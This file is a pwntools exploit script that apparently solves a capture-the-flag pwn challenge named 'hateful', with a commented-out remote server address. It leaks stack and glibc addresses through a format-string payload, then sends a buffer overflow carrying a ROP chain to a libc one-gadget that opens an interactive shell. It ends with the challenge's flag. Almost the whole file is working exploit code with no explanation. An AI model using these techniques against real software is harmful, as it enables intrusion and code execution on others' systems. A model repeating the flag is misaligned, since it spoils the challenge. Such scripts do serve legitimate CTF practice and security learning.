from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./hateful"
p = gdb.debug(['./ld-linux-x86-64.so.2', '--library-path', '.', CHALLENGE], '''
    file hateful
    ni
    ni
    b *(send_message+111)
    b *(send_message+183)
    continue
''')

# p = remote('52.59.124.14', 5020)

# Stage 1: Leak stack address and glibc base address
print(p.recvuntil(b">> ").decode())
payload = b"yay"
p.sendline(payload)
print(p.recvuntil(b">> ").decode())
payload = b"%p%p%p%p%p"
p.sendline(payload)
print(p.recvuntil(b"email provided: ").decode())
addrs = p.recvuntil(b"\n").decode().strip()
stack_addr = int(addrs[0:14], 16) + 0x2190
glibc_base_addr = int(addrs[-14:], 16) - 0x1d2a80
print(f"stack_addr: {hex(stack_addr)}")
print(f"glibc_base_addr: {hex(glibc_base_addr)}")

# Stage 2: Form ROP chain with one gadget and send payload
glibc_r = ROP("libc.so.6")
chain = [
    glibc_r.rdi.address + glibc_base_addr,  # pop rdi; ret
    0x0,    # NULL
    glibc_r.r13.address + glibc_base_addr,  # pop r13; ret
    0x0,    # NULL
    0xd511f + glibc_base_addr  # one gadget
]
print(p.recvuntil(b"now please provide the message!\n").decode())
payload = b"A" * 0x3f0 + p64(stack_addr) + b"".join([p64(c) for c in chain])
p.sendline(payload)

p.interactive()

# ENO{W3_4R3_50RRY_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}
